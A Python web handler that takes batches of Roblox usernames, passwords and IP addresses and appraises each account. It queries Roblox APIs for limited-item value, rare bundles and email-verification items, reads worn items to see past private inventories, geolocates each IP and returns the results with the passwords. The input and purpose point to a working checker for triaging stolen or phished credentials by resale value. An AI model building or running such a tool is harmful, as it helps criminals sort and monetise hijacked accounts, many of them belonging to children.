PREFETCH_USERS = {}
PREFETCH_AVATARS = {}
import time
from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import concurrent.futures

VERIFIED_ITEM_IDS = [102611803, 1567446]

# Bundle ID resmi Roblox + harga Robux-nya (bukan RAP)
BUNDLES = {
    201: ("Headless Horseman", 31000),
    192: ("Korblox Deathspeaker", 17000),
    1693: ("Malivinius", 300),
    338: ("Violet Valkyrie", 50000),
    109: ("Ice Valkyrie", 40000)
}

# Asset ID bagian tubuh / aksesoris yang terbaca meski inventory PRIVATE (via Avatar API)
WORN_SPECIAL_ASSETS = {
    139607718: ("Korblox Deathspeaker", 17000),
    139607673: ("Korblox Deathspeaker", 17000),
    139607570: ("Korblox Deathspeaker", 17000),
    139607625: ("Korblox Deathspeaker", 17000),
    139607770: ("Korblox Deathspeaker", 17000),
    1509305368: ("Headless Horseman", 31000),
    134082579: ("Headless Horseman", 31000),
    1402432199: ("Violet Valkyrie", 50000),
    4390890198: ("Ice Valkyrie", 40000),
    1365767: ("Valkyrie Helm", 20000),
    1029025: ("Dominus Frigidus", 0),
    138932314: ("Dominus Aureus", 0),
    162067148: ("Dominus Infernus", 0)
}

def req_json(url, method="GET", payload=None, timeout=6):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    data = json.dumps(payload).encode("utf-8") if payload else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            return res.status, json.loads(res.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        if e.code == 429:
            time.sleep(0.2)
        return e.code, None
    except Exception:
        return 500, None

def get_country(ip):
    if not ip or ip in ("-", "N/A", "Unknown") or ":" in ip:
        return "Unknown"
    st, data = req_json(f"https://ipwho.is/{ip}", timeout=4)
    if st == 200 and data and data.get("success"):
        return data.get("country", "Unknown")
    return "Unknown"

def has_item(uid, item_type, item_id):
    st, data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/{item_type}/{item_id}", timeout=5)
    return st == 200 and data and len(data.get("data", [])) > 0


def bulk_resolve_users(usernames):
    clean = list({u.strip() for u in usernames if u and u.strip()})
    user_map = {}
    for i in range(0, len(clean), 100):
        chunk = clean[i:i+100]
        st, res = req_json("https://users.roblox.com/v1/usernames/users", "POST", {
            "usernames": chunk,
            "excludeBannedUsers": False
        })
        if st == 200 and isinstance(res, dict):
            for item in res.get("data", []):
                req_u = (item.get("requestedUsername") or item.get("name") or "").lower()
                if req_u:
                    user_map[req_u] = item
    return user_map

def bulk_avatars(user_ids):
    ids = [str(uid) for uid in user_ids if uid]
    av_map = {}
    for i in range(0, len(ids), 100):
        chunk = ids[i:i+100]
        st, res = req_json(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={','.join(chunk)}&size=150x150&format=Png&isCircular=false")
        if st == 200 and isinstance(res, dict):
            for item in res.get("data", []):
                av_map[item.get("targetId")] = item.get("imageUrl", "")
    return av_map

def scan_one(acc):
    usn = acc.get("usn", "").strip()
    pw = acc.get("pass", "-")
    ip = acc.get("ip", "-")

    out = {
        "usn": usn, "pass": pw, "ip": ip, "location": "Unknown",
        "name": usn, "id": None, "is_banned": False, "avatar_url": "",
        "total_rap": 0, "bundle_value": 0, "limited_found": [], "limited_items": [],
        "has_verified": False, "is_private": False
    }
    if not usn:
        return out

    cached_u = PREFETCH_USERS.get(usn.lower())
    st, udata = (200, {"data": [cached_u]}) if cached_u else req_json("https://users.roblox.com/v1/usernames/users", "POST", {"usernames": [usn], "excludeBannedUsers": False})
    if st != 200 or not udata or not udata.get("data"):
        return out

    uid = udata["data"][0]["id"]
    out["id"] = uid
    out["name"] = udata["data"][0].get("displayName", usn)

    cached_av = PREFETCH_AVATARS.get(uid)
    _, av = (200, {"data": [{"imageUrl": cached_av}]}) if cached_av is not None else req_json(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false")
    if av and av.get("data"):
        out["avatar_url"] = av["data"][0].get("imageUrl", "")

    # 1. Cek Topi Hijau Verifikasi Email
    # Cek semua varian Topi Hijau / Sign verifikasi email (102611803 & 1567446)
    verified = False
    for vid in VERIFIED_ITEM_IDS:
        if has_item(uid, "Asset", vid):
            verified = True
            break
    if not verified:
        st_av, av_data = req_json(f"https://avatar.roblox.com/v1/users/{uid}/avatar")
        if st_av == 200 and isinstance(av_data, dict):
            worn_ids = {a.get("id") for a in av_data.get("assets", [])}
            if any(vid in worn_ids for vid in VERIFIED_ITEM_IDS):
                verified = True
    out["has_verified"] = verified

    found_names = []
    limited_items = []
    bundle_val = 0

    def add_bundle(label, price):
        nonlocal bundle_val
        if label not in found_names:
            found_names.append(label)
            limited_items.append({"name": label, "rap": 0, "bundle_price": price, "is_bundle": True})
            bundle_val += price

    # 2. Cek Bundle via Inventory API (jika publik)
    for bid, (label, price) in BUNDLES.items():
        if has_item(uid, "Bundle", bid):
            add_bundle(label, price)

    # 3. Cek Avatar yang Sedang Dipakai (tetap tembus meski inventory PRIVATE!)
    st_av, av_data = req_json(f"https://avatar.roblox.com/v1/users/{uid}/avatar", timeout=5)
    if st_av == 200 and av_data:
        for asset in av_data.get("assets", []):
            aid = asset.get("id")
            aname = (asset.get("name") or "").lower()
            if aid in WORN_SPECIAL_ASSETS:
                lbl, prc = WORN_SPECIAL_ASSETS[aid]
                add_bundle(lbl, prc)
            elif "korblox" in aname:
                add_bundle("Korblox Deathspeaker", 17000)
            elif "headless" in aname:
                add_bundle("Headless Horseman", 31000)
            elif "malivinius" in aname:
                add_bundle("Malivinius", 300)
            elif "valkyrie" in aname:
                add_bundle(asset.get("name"), 50000)
            elif "dominus" in aname:
                add_bundle(asset.get("name"), 0)

    # 4. Cek Item Limited & RAP
    st_col, col = req_json(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
    if st_col == 403:
        out["is_private"] = True
    elif st_col == 200 and col:
        rap = 0
        for it in col.get("data", []):
            item_rap = it.get("recentAveragePrice") or 0
            item_name = it.get("name") or "Unknown Limited"
            rap += item_rap
            if item_name not in found_names:
                found_names.append(item_name)
            limited_items.append({"name": item_name, "rap": item_rap, "is_bundle": False})
        out["total_rap"] = rap

    # Cek kepemilikan Bundle/Asset spesial (Korblox, Malivinius, Headless, dll.) di inventory publik meski unequipped
    if not out.get("is_private") and "WORN_SPECIAL_ASSETS" in globals():
        rep_by_name = {}
        for aid, info in WORN_SPECIAL_ASSETS.items():
            b_name, b_val = info[0], info[1]
            if b_name not in rep_by_name:
                rep_by_name[b_name] = (aid, b_val)
        extra_bundles = {"Korblox Deathspeaker": 192, "Headless Horseman": 201}
        for b_name, (rep_aid, b_val) in rep_by_name.items():
            if b_name in found_names:
                continue
            owned = has_item(uid, "Asset", rep_aid)
            if not owned and b_name in extra_bundles:
                owned = has_item(uid, "Bundle", extra_bundles[b_name])
            if owned:
                found_names.append(b_name)
                bundle_val += b_val
                limited_items.append({"name": b_name, "rap": b_val, "is_bundle": True})
    out["bundle_value"] = bundle_val
    out["limited_found"] = found_names
    out["limited_items"] = limited_items
    out["location"] = get_country(ip)
    return out

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length).decode("utf-8"))
            accounts = body.get("accounts", [])

            global PREFETCH_USERS, PREFETCH_AVATARS
            PREFETCH_USERS = bulk_resolve_users([a.get("usn","") for a in accounts])
            PREFETCH_AVATARS = bulk_avatars([u.get("id") for u in PREFETCH_USERS.values()])
            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
                results = list(ex.map(scan_one, accounts))

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"results": results}).encode("utf-8"))
        except Exception as e:
            self.send_response(500)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))
